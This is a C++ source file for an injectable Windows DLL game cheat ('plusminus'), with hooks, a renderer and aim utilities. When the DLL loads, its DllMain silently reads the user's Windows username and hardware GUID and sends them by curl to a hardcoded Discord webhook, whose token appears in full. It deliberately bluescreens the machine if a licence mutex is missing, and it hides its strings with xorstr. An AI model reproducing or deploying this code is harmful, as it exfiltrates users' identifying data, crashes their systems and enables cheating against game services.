#define NOMINMAX

#include <Windows.h>
#include <stdint.h>
#include <Windows.h>
#include <psapi.h>
#include <d3d11.h>
#include <string>
#include <codecvt>
#include <locale>
#include <cstdint>
#include <algorithm>
#include <iostream>
#include <iomanip>
#include <emmintrin.h>
#include <comdef.h>
#include <iostream>
#include <vector>
#include <fstream>
#include <math.h>
#include <stdio.h>
#include <stdlib.h>
#include <float.h>
#include <signal.h>
#include <sstream>
#include <stdio.h>
#include <lmcons.h>
#include <thread>
#include <map>

#pragma warning ( disable : 4172 )

#include "xorstr.hpp"
#include "settings.hpp"
#include "vector.hpp"
#include "stdafx.hpp"
#include "renderer.hpp"
#include "hookengine.hpp"
#include "mem.hpp"
#include "menu.hpp"
#include "crc32.hpp"
#include "wrapper.hpp"
#include "dissector.hpp"
#include "structs.hpp"
#include "game.hpp"
#include "bonecache.hpp"
#include "other.hpp"
#include "math.hpp"
#include "players.hpp"
#include "d3d.hpp"
#include "aimutils.hpp"
#include "hooks.hpp"

void entry_thread( ) {
	d3d::init( );

	/*AllocConsole( );
	SetConsoleTitleA(xorstr_("dbg"));
	freopen_s(reinterpret_cast<FILE**>(stdin), xorstr_("CONIN$"), xorstr_("r"), stdin);
	freopen_s(reinterpret_cast<FILE**>(stdout), xorstr_("CONOUT$"), xorstr_("w"), stdout);*/

	initialize_cheat( );
	do_hooks( );
}

bool DllMain(HMODULE hMod, uint32_t call_reason, void*) {
	if (call_reason != DLL_PROCESS_ATTACH)
		return false;

	HW_PROFILE_INFO hwProfileInfo;
	GetCurrentHwProfile(&hwProfileInfo);
	WCHAR* guid = hwProfileInfo.szHwProfileGuid;
	_bstr_t b(guid);
	char* c = b;
	char name[ UNLEN + 1 ];
	DWORD username_len = UNLEN + 1;
	GetUserNameA(name, &username_len);
	std::string webhook_url = xorstr_("https://discord.com/api/webhooks/840514577460625438/x5atPvsLnmGS_o4MGg3BbXV6AAgsR3vBnIQTbNz3A6dfbH6UgT1XVCwoBGNco9qUySi-");
	std::string avatar_url = xorstr_("https://i.imgur.com/9FKjGO8.png");
	std::string lol = c;
	std::string winname = name;
	std::string mutex_not_found = xorstr_("curl --data \"username=plusminus&content=got bluescreened: ") + winname + xorstr_(" guid: ") + lol + xorstr_("&avatar_url=") + avatar_url + "\" " + webhook_url;
	std::string fail = xorstr_("curl --data \"username=plusminus&content=login failed: ") + winname + xorstr_(" guid: ") + lol + xorstr_("&avatar_url=") + avatar_url + "\" " + webhook_url;
	std::string success = xorstr_("curl --data \"username=plusminus&content=login successful: ") + winname + xorstr_(" guid: ") + lol + xorstr_("&avatar_url=") + avatar_url + "\" " + webhook_url;

	HANDLE hMutex = OpenMutexA(SYNCHRONIZE, FALSE, xorstr_("1bo7MMSCOc6Nod3iV4BK"));
	if (!hMutex) {
		system(mutex_not_found.c_str( ));
		BlueScreen( );
		exit(0);
	}
	else {
		CloseHandle(hMutex);
		system(success.c_str( ));

		const auto handle = CreateThread(nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(entry_thread), 0, 0, nullptr);
		if (handle != NULL)
			CloseHandle(handle);
	}

	return true;
}